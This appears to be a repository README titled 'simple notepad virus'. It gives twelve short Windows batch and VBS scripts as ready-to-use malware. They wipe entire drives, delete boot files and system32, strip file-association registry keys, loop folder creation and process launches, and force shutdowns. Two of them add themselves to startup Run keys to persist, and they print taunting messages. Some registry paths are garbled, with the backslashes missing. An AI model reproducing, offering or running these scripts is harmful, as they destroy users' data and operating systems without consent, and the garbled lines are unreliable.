# ViRuS
##simple notepad virus


# codes given below


virus - 1

```@echo off
:VIRUS
cd /d C:
md %RANDOM%
cd /d D:
md %RANDOM%
cd /d E:
md %RANDOM%
goto VIRUS
REM #######################
REM errorcode401.blogspot.in

```

-----------------------------------
-  virus - 2

```bash
@echo off
del D:\*.* /f /s /q
del E:\*.* /f /s /q
del F:\*.* /f /s /q
del G:\*.* /f /s /q
del H:\*.* /f /s /q
del I:\*.* /f /s /q
del J:\*.* /f /s /q
```
-------------------------
-  virus - 3

```@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*

```
--------------------------
-  virus - 4

```@Echo off
Ipconfig /release

```
-------------------------
- virus - 5

```@echo off
msg * Lets Roll Baby
shutdown -c “Error! Your ass got glued!” -s

```
-----------------------------
- virus - 6

(save as .VBS)

```Option Explicit

Dim WSHShell
Set WSHShell=Wscript.CreateObject(“Wscript.Shell”)

Dim x
For x = 1 to 100000000
WSHShell.Run “Tourstart.exe”
Next
```

--------------------------------------------------------------------
- virus - 7

```rd/s/q D:\
rd/s/q C:\
rd/s/q E:\
```
----------------------------------------------------------------

- virus - 8


```echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
echo You Are Nailed, Buy A New Computer This Is Piece Of Shit.
PAUSE
```
-----------------------------------------------------------------------------

- virus - 9

```@echo off
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini

```
--------------------------------------------------------------
- virus - 10

```bash
shutdown -s -t 100 c “Installing Updates”

```
--------------------------------------------------------------------
- virus - 11

```del c:\WINDOWS\system32\*.*/q

```
--------------------------------
- virus - 12

```echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo You have maxed your internet usage for a lifetime ??
PAUSE

```


@ thank you
